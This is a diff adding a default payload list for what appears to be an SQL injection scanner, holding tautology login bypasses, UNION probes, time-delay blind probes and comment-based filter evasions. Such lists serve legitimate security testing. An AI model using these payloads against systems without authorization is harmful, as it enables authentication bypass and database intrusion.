@@ -1,0 +1,27 @@
+# File: payloads/default.txt
+# Built-in payloads (one per line).
+# You can regenerate this with `save_builtin_payloads("payloads/default.txt")`.
+
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+' OR 'a'='a
+') OR ('1'='1
+' OR '' = '
+' UNION SELECT NULL, 'SQLISCANNERUNIONTEST' -- 
+" UNION SELECT "SQLISCANNERUNIONTEST" -- 
+') UNION SELECT 'SQLISCANNERUNIONTEST' /*
+'; WAITFOR DELAY '0:0:10' --
+'; SELECT pg_sleep(10)--
+' OR SLEEP(10) -- 
+" OR pg_sleep(10) -- 
+') OR SLEEP(10) /*
+' AND 1=1 --
+' AND 1=2 --
+" AND 1=1 --
+" AND 1=2 --
+'/*!50000OR*/'1'/*!50000=*/='1
+' OR 1=1#
+' OR 1=1/**/
+' OR 1=1%00
+' OR 1=1-- -
